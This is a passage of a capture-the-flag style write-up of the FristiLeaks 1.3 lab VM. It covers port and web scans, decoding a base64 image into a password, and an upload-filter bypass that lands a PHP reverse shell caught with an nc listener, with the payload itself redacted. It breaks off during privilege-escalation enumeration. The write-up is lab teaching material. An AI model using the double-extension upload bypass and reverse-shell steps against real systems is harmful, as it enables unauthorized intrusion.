This can be done in Virtualbox via: Settings (ctrl +S) -&amp;gt; Network -&amp;gt; Advanced -&amp;gt; Input &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;080027A5A676&lt;/code&gt; into the &lt;em&gt;MAC Address&lt;/em&gt; field.&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;

&lt;p&gt;Let’s start as always with NMAP scans.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/FristiLeaks1.3:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sSV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; fristiLeaks1.3_nmap 10.0.0.64
Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-08-01 17:33 EDT
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.64
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00011s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.15 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; DAV/2 PHP/5.3.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 3 disallowed entries 
|_/cola /sisi /beer
|_http-server-header: Apache/2.2.15 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; DAV/2 PHP/5.3.3
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=UTF-8).
MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Interesting, looks like this will be heavily web-based. Let’s go ahead and get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nikto&lt;/code&gt; kicked off.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nikto &lt;span class=&quot;nt&quot;&gt;-host&lt;/span&gt; 10.0.0.64
- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          10.0.0.64
+ Target Hostname:    10.0.0.64
+ Target Port:        80
+ Start Time:         2020-08-01 23:56:26 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: Apache/2.2.15 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; DAV/2 PHP/5.3.3
+ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS                                                                                                             
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;                                                                             
+ Entry &lt;span class=&quot;s1&quot;&gt;'/cola/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                
+ Entry &lt;span class=&quot;s1&quot;&gt;'/sisi/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                
+ Entry &lt;span class=&quot;s1&quot;&gt;'/beer/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                
+ &lt;span class=&quot;s2&quot;&gt;&quot;robots.txt&quot;&lt;/span&gt; contains 3 entries which should be manually viewed.                                                 
+ Apache/2.2.15 appears to be outdated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current is at least Apache/2.4.37&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Apache 2.2.34 is the EOL &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the 2.x branch.                                                                                                              
+ PHP/5.3.3 appears to be outdated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current is at least 7.2.12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each branch.                                                                                          
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE                                                            
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST                                 
+ OSVDB-3268: /icons/: Directory indexing found.                                                                   
+ OSVDB-3268: /images/: Directory indexing found.                                                                  
+ OSVDB-3233: /icons/README: Apache default file found.                                                            
+ 8701 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 15 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host                                                 
+ End Time:           2020-08-01 23:56:35 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                      
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;                                        
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested                                                                                                 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I’ll  enumerate a bit using a web browser. We’ll start as usual by just browsing to the default landing page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Fristi_1.PNG&quot; alt=&quot;Landing Page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing interesting here, let’s start looking at the sub-directories that nikto and NMAP picked up.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cola/&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sisi/&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/beer/&lt;/code&gt; all result in the following page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Fristi_2.PNG&quot; alt=&quot;cola&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This part took me a while, but after thinking about it I simply tried &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/fristi&lt;/code&gt; and got the following result:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Fristi_3.PNG&quot; alt=&quot;Frist admin page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So kinda stupid. IDK, I banged my head against this trying to find some sweet bypass but whatever. Let’s keep moving on.&lt;/p&gt;

&lt;p&gt;We can start by taking a look at the source code of this login page:&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;description&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;super leet password login-test page. We use base64 encoding for images so they are inline in the HTML. I read somewhere on the web, that thats a good way to do it.&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 
TODO:
We need to clean this up for production. I left some junk in here to make testing easier.

- by eezeepz
--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt; Welcome to #fristileaks admin portal&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;

~~~ REDACTED BASE64 ~~~

&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 
iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx
jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl
S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw
B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f
m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ
Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb
DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd
jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU
12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5
uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1
04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq
i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg
tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws
30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl
3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK
ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q
mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34
rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe
EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH
AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk
CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR
U5ErkJggg==
--&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I got rid of the meaningless info, namely the image that we saw in the previous screenshot. This reveals a couple things:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;A Base64 Id that is probably the key to our next step&lt;/li&gt;
  &lt;li&gt;A username of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eezepz&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;An HTML comment that is base64.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Cool, let’s grab the base64 HTML comment and see what it contains:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;HTMLcomment | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
�PNG
▒
IHDRm4�A�sRGB���gAMA��
                      �a        pHYs���o�dRIDATx^��Qv� �a��
                                                           �z��l&amp;amp;�I%KH�@f45�5��VI
                                                                                 ���s��~���E��&lt;span class=&quot;s2&quot;&gt;&quot;Gx�#��^/r�9���E��&quot;&lt;/span&gt;Gx�#��^/r�9���E��&lt;span class=&quot;s2&quot;&gt;&quot;Gx�#��^/�����&amp;amp;������T3h��#3՗j�
                                                                                                                                                                 ��~�ݿ~��2�Z�e��L������ZZUW&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$�&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;o��y���{K}�f�P����9{�6�X��KKL&amp;gt;����a�%�ZD�
                                                                                                                                                                                                                                      �Ś�B�'��*�%&amp;amp;��Rxg�յ���V3]��#q�pz�R�&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\Z&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b�n��   -]�յ���JH5�9r(����I5se��G�tXq&quot;&lt;/span&gt;k�6���j�                                  ���6��
F��n�T3W��ג���ߞ���j�                                                          �g&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;�Yx�i�bѢꍗj�ʒ�H-Y��ʯ��JH5Ӆx�D7&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
                    ��ߠ�MI6�������D3�
                                     ������M���JH5ӅZ�l3�GY�d��M▒o6��T�rR�
                                                                         ��/�-��5ӅJ��I,�i9�l�Ѣ��Y��D���![

�o����͹tWK&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;�f�h�����&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;d� &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;��T5!Ռuɘ-��Ӈ������Ӌ,����C-GR��,����kj�&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&amp;lt;���g.Ռuɘ-��V�_u��Z����#�|��_�A��Ӝ��&lt;span class=&quot;s1&quot;&gt;'c�jƸdЖJ{&amp;lt;7
����9C}�f�P�4��p�]��O���I5c\2hK�G����t��b����#�*�       ��:�����R��J��jƺ$����#+o`���L*9�I:�����,��&amp;gt;��U騢&quot;�3�jƼdȖ�ˆ#۞�����j��)'&lt;/span&gt;�zUq��F&amp;gt;L�Z���[Z4���LZ�R&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;�f�ˑ����S&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;���|�������f.-������h��FEZ�T_��&amp;gt;�sd�a6�&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;.�U^n|/�����ZZ��&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;�#&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;t����T_��&amp;gt;Trd��+?���8�7�j-�&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;d��R�t!�#�[/r�9���E��&lt;span class=&quot;s2&quot;&gt;&quot;Gx�#��^/r�9���E��&quot;&lt;/span&gt;Gx�#��^/r�9���E��&lt;span class=&quot;s2&quot;&gt;&quot;Gx�#��^/r�9���E�����Z�8�rqIEND�B&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;�ein@~/VulnHub/FristiLeaks1.3:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We get a bunch of binary data, but we can clearly see some &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PNG&lt;/code&gt; magic bytes in the beginning there, let’s pipe the output to a file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;HTMLcomment | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; image.png
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And viewing the image gives us:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Fristi_4.PNG&quot; alt=&quot;Decoded image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nice, this is most likely a password.&lt;/p&gt;

&lt;p&gt;At first glance I thought it was maybe a cleartext password migrated to an esoteric language, like &lt;a href=&quot;https://en.wikipedia.org/wiki/Brainfuck&quot;&gt;brainfuck&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Looking back, I should have tried the lowest-hanging fruit first. If we go  back to the admin login page and try the following creds: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eezeepz:keKkeKKeKKeKkEkkEk&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Fristi_5.PNG&quot; alt=&quot;Successful login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have a successful login. Nice.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;p&gt;Let’s begin to check out the file upload mechanism on the webpage:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Uploading, please &lt;span class=&quot;nb&quot;&gt;wait
&lt;/span&gt;The file has been uploaded to /uploads 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And trying to upload a random file type gives us this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sorry, is not a valid file. Only allowed are: png,jpg,gif
Sorry, file not uploaded 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, let’s try uploading a PHP reverse shell by simply changing the file name using Burp. For our purposes we’ll use the PHP web shell located on Kali in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/webshells/php&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /fristi/do_upload.php HTTP/1.1
Host: fristi
User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;X11&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Linux x86_64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:68.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5
Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
Referer: http://fristi/fristi/upload.php
Content-Type: multipart/form-data&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;boundary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---------------------------1741988992628995641674019453&lt;/span&gt;
Content-Length: 5862
Connection: close
Cookie: &lt;span class=&quot;nv&quot;&gt;PHPSESSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ri1lakotitu9ijlqn0ua4gheh5
Upgrade-Insecure-Requests: 1

&lt;span class=&quot;nt&quot;&gt;-----------------------------1741988992628995641674019453&lt;/span&gt;
Content-Disposition: form-data&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fileToUpload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;php-reverse-shell.php.gif&quot;&lt;/span&gt;
Content-Type: application/x-php

~~~ REDACTED ~~~

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, we simply added &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gif&lt;/code&gt; to the end of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filename=&lt;/code&gt; parameter. This successfully bypasses the control and uploads our file.&lt;/p&gt;

&lt;p&gt;I’ll go ahead and setup the listener I specified in the reverse shell (for me this was done via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rlwrap nc -nvlp 6969&lt;/code&gt;) and browse to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/fristi/fristi/uploads/php-reverse-shell.php.gif&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;And we get a shell:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/VulnHub/Fristi_6.PNG&quot; alt=&quot;Successful login&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h1&gt;

&lt;p&gt;Moving on to privesc the first thing to note is that we are the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt; user.&lt;/p&gt;

&lt;p&gt;With this in mind let’s check out the webserver directory to see if there’s anything we can see on the backend:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /var/www
total 28
drwxr-xr-x.  6 root root 4096 Nov 17  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 19 root root 4096 Nov 19  2015 ..
drwxr-xr-x.  2 root root 4096 Aug 24  2015 cgi-bin
drwxr-xr-x.  3 root root 4096 Nov 17  2015 error
drwxr-xr-x.  7 root root 4096 Nov 25  2015 html
drwxr-xr-x.  3 root root 4096 Nov 17  2015 icons
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root   98 Nov 17  2015 notes.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hmmm… let’s see what &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;notes.txt&lt;/code&gt; says:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;notes.txt
hey eezeepz your homedir is a mess, go clean it up, just dont delete
the important stuff.

&lt;span class=&quot;nt&quot;&gt;-jerry&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay, following the breadcrumbs:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home/eezeepz
total 2608
drwx---r-x. 5 eezeepz eezeepz  12288 Nov 18  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 5 root    root      4096 Nov 19  2015 ..
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .Old
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz     18 Sep 22  2015 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz    176 Sep 22  2015 .bash_profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz    124 Sep 22  2015 .bashrc
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .gnome
drwxrwxr-x. 2 eezeepz eezeepz   4096 Nov 17  2015 .settings
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  24376 Nov 17  2015 MAKEDEV
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  33559 Nov 17  2015 cbq
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz   6976 Nov 17  2015 cciss_id
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  56720 Nov 17  2015 cfdisk
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  25072 Nov 17  2015 chcpu
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  52936 Nov 17  2015 &lt;span class=&quot;nb&quot;&gt;chgrp&lt;/span&gt;
